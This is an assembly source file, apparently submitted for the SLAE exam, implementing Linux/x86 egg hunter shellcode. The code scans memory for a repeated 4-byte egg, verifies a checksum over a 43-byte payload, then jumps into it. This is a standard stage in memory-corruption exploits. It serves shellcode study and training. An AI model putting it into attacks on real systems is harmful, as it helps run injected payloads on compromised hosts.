; Filename: egghunter.nasm
; Author: Ray Doyle (@doylersec)
; Website: https://www.doyler.net
;
; Purpose: SLAE Exam Assignment #3 - Egg Hunter Shellcode (Linux/x86)

global _start            

section .text
_start:
    ;cld  ; Clear the direction flag, for when it is set

page_align:
    or cx,0xfff  ; Perform page alignment

page_inc:
    inc ecx  ; Increment address

sigaction:
    push 0x43  ; sys_sigaction
    pop eax  ; Load syscall into EAX
    int 0x80  ; Execute sigaction()

check_mem:
    cmp al, 0xf2  ; Compare return value to EFAULT
    jz page_align  ; If EFAULT occured, go to the next page (re-align)

check_egg:
    mov eax, 0x5058535b  ; Egg value to compare to
    mov edi, ecx  ; Save address pointer in EDI
    scasd  ; Compare EAX (egg) to EDI (first 4 bytes)
    jnz page_inc  ; If no egg, go to the next page
    scasd  ; If first egg found, perform compare to EDI (second 4 bytes)
    jnz page_inc  ; If no second egg, go to next page

; https://www.exploit-db.com/exploits/14873/
; https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/egghunter.rb
find_egg:
    push ecx  ; Save the current value of ECX (not included in original)
    xor ecx, ecx  ; Zero out the counter
    xor eax, eax  ; Zero out the accumlator

calc_chksum_loop:
    add al, byte [edi+ecx]  ; Add the byte to running total
    inc ecx  ; Increment the counter
    ; Payload length = 43 (0x2b)
    cmp cl, 0x2b  ; cmp counter to egg_size  --  ECX if length >= 256
    jnz calc_chksum_loop    ;if it's not equal repeat
 
test_ckksum:
    cmp al, byte [edi+ecx]  ; cmp eax with 1 byte checksum
    pop ecx
    jnz page_align  ; Increment page to begin search (failed checksum)
execute:
    jmp edi